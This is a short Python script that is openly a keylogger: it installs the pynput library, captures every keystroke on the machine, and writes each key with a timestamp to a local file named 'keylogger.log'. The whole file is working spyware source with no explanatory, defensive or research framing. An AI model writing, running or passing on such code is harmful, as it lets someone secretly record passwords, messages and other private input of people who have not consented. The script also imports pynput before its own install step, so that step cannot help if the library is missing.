import subprocess
import os
import logging
from pynput import keyboard

# Function to install dependencies
def install_dependencies():
    dependencies = ['pynput']
    subprocess.check_call([os.sys.executable, '-m', 'pip', 'install'] + dependencies)

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def start_keylogger():
    # Configure logging
    logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    install_dependencies()
    start_keylogger()
